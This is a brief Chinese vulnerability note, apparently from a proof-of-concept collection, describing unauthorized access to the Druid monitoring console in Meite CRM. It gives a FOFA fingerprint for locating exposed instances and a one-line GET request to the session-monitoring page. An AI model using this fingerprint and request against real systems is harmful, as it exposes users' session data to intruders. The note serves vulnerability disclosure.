## 美特CRM-druid组件-未授权访问漏洞

## 一、漏洞简介
Druid提供的监控功能,监控SQL的执行时间、监控Web URI的请求、Session监控，当开发者配置不当时就可能造成未授权访问漏洞。

## fofa
```
body="/common/scripts/basic.js"
```

## poc
```
GET /druid/websession.html
```
